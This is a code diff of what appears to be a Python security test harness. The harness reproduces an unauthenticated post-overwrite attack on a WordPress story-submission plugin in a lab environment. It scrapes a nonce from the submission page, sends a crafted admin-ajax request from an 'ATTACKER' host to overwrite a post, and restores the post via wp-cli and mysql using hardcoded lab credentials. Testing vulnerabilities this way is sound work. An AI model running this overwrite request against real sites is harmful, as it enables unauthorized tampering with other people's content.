@@ -9,12 +9,12 @@ CORP_HOST = "Host: corp.com"
 NONCE = re.compile(r'"nonce":"([a-f0-9]+)"')
 
 
-def _target_post():
+def _target_post(session=None):
     out = run(CORP_DB, [
         "mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e",
         "SELECT ID,post_author,post_status,post_title,post_content,post_excerpt "
         "FROM wp_posts WHERE post_type='post' ORDER BY ID ASC LIMIT 1;",
-    ]).stdout
+    ], session=session).stdout
     post_id, author, status, title, content, excerpt = out.rstrip("\n").split("\t", 5)
     return {
         "ID": post_id,
@@ -26,12 +26,12 @@ def _target_post():
     }
 
 
-def _row(post_id):
+def _row(post_id, session=None):
     out = run(CORP_DB, [
         "mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e",
         f"SELECT post_title,post_content,post_excerpt,post_status FROM wp_posts "
         f"WHERE ID={post_id};",
-    ]).stdout
+    ], session=session).stdout
     title, content, excerpt, status = out.rstrip("\n").split("\t", 3)
     return {
         "post_title": title,
@@ -41,17 +41,17 @@ def _row(post_id):
     }
 
 
-def _nonce():
+def _nonce(session=None):
     page = run(ATTACKER, [
         "curl", "-s", "-H", CORP_HOST, "--max-time", "20",
         f"{TARGET_PUBLIC}/submit-a-story/",
-    ]).stdout
+    ], session=session).stdout
     found = NONCE.search(page)
     assert found, "no rbGlobalSubmissionSettings nonce on the live corp.com submission page; is corp-wp up?"
     return found.group(1)
 
 
-def _overwrite_post(nonce, post_id, title, excerpt, content):
+def _overwrite_post(nonce, post_id, title, excerpt, content, session=None):
     return run(ATTACKER, [
         "curl", "-s", "--max-time", "20",
         "-H", CORP_HOST,
@@ -65,24 +65,25 @@ def _overwrite_post(nonce, post_id, title, excerpt, content):
         "--data-urlencode", "userName=Anonymous Contributor",
         "--data-urlencode", "userEmail=anon@example.com",
         f"{TARGET_PUBLIC}/wp-admin/admin-ajax.php",
-    ]).stdout.strip()
+    ], session=session).stdout.strip()
 
 
-def _restore(original):
+def _restore(original, session=None):
     run(CORP, [
         "wp", "--allow-root", "post", "update", original["ID"],
         f"--post_title={original['post_title']}",
         f"--post_excerpt={original['post_excerpt']}",
         f"--post_status={original['post_status']}",
-    ])
+    ], session=session)
     run(CORP_DB, [
         "mysql", "-uwordpress", "-pwordpress", "wordpress", "-e",
         "UPDATE wp_posts SET post_content=%s WHERE ID=%s" % (
             _sql_quote(original["post_content"]), original["ID"],
         ),
-    ])
-    run(CORP, ["wp", "--allow-root", "post", "meta", "delete", original["ID"], "rbsm_form_id"])
-    run(CORP, ["wp", "--allow-root", "post", "meta", "delete", original["ID"], "rbsm_author_info"])
+    ], session=session)
+    for meta in ("rbsm_form_id", "rbsm_author_info"):
+        run(CORP, ["wp", "--allow-root", "post", "meta", "delete", original["ID"], meta],
+            session=session)
 
 
 def _sql_quote(value):
